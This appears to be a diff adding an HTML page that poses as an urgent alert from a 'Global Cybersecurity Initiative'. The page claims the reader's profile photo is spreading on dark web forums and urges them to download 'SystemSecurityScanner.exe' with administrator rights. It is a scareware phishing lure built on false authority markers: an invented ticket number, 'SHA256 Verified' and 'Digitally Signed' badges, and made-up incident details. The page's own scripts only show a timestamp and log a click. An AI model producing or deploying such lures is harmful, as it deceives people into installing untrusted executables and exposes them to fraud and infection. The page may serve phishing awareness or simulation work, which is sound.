@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Image Security Alert - Global Cybersecurity Initiative</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin: 20px 0;
+        }
+
+        .header {
+            text-align: center;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+
+        .alert-badge {
+            background: #dc3545;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        .severity-high {
+            color: #dc3545;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .details {
+            background: #f8f9fa;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .button {
+            background: linear-gradient(45deg, #dc3545, #c82333);
+            color: white;
+            padding: 15px 40px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: inline-block;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
+        }
+
+        .verification {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        ul {
+            line-height: 1.6;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="alert-badge">URGENT SECURITY ALERT</div>
+            <h1>🛡️ Global Cybersecurity Initiative</h1>
+            <h2>Image Compromise Detection Alert</h2>
+        </div>
+
+        <div class="details">
+            <h3>🔍 Alert Summary</h3>
+            <p>Our advanced threat intelligence platform has detected unauthorized distribution of your profile image
+                across dark web networks.</p>
+
+            <p class="severity-high">THREAT LEVEL: HIGH</p>
+
+            <h4>📋 Incident Details:</h4>
+            <ul>
+                <li><strong>Compromised Asset:</strong> Official profile photograph</li>
+                <li><strong>Source:</strong> "Operation Phantom" data breach cluster</li>
+                <li><strong>Distribution:</strong> 3 dark web forums, 1 marketplace</li>
+                <li><strong>Potential Impact:</strong> Identity theft, social engineering attacks, reputation damage
+                </li>
+                <li><strong>Time of Detection:</strong>
+                    <script>document.write(new Date().toLocaleString());</script>
+                </li>
+            </ul>
+        </div>
+
+        <div class="verification">
+            <h3>✅ Verification Status</h3>
+            <p>This alert has been verified by our Threat Analysis Team (Ticket #GCI-2024-08771).</p>
+        </div>
+
+        <h3>🚨 Required Immediate Action</h3>
+        <p>To secure your digital identity and prevent potential misuse:</p>
+        <ol>
+            <li>Download our official Security Scanner tool</li>
+            <li>Run the scanner to remove compromised images</li>
+            <li>Complete system integrity check</li>
+            <li>Apply recommended security patches</li>
+        </ol>
+
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="/download/scanner" class="button">
+                🔒 Download Security Scanner v2.1.4
+            </a>
+            <p style="font-size: 14px; margin-top: 10px; color: #666;">
+                File: SystemSecurityScanner.exe (12.8 MB)<br>
+                SHA256 Verified • Digitally Signed • Updated: Today
+            </p>
+        </div>
+
+        <div style="background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px;">
+            <h4>⚠️ Important Notes:</h4>
+            <ul>
+                <li>This scanner works on Windows 10/11 systems</li>
+                <li>Administrator privileges may be required for full system scan</li>
+                <li>Scan typically takes 2-3 minutes to complete</li>
+                <li>Internet connection required for threat database updates</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <p>Global Cybersecurity Initiative • Official Threat Response Division<br>
+                This is an automated security notification. Do not reply to this message.<br>
+                Reference: GCI-THREAT-2024-IMAGE-COMPROMISE-ALPHA</p>
+        </div>
+    </div>
+
+    <script>
+        // Add some dynamic elements
+        document.addEventListener('DOMContentLoaded', function () {
+            // Update detection time every minute
+            setInterval(updateTime, 60000);
+
+            // Add click tracking (optional)
+            document.querySelector('.button').addEventListener('click', function () {
+                console.log('Security scanner download initiated');
+            });
+        });
+
+        function updateTime() {
+            const timeElement = document.querySelector('.details li:last-child');
+            if (timeElement) {
+                timeElement.innerHTML = '<strong>Time of Detection:</strong> ' + new Date().toLocaleString();
+            }
+        }
+    </script>
+</body>
+
+</html>
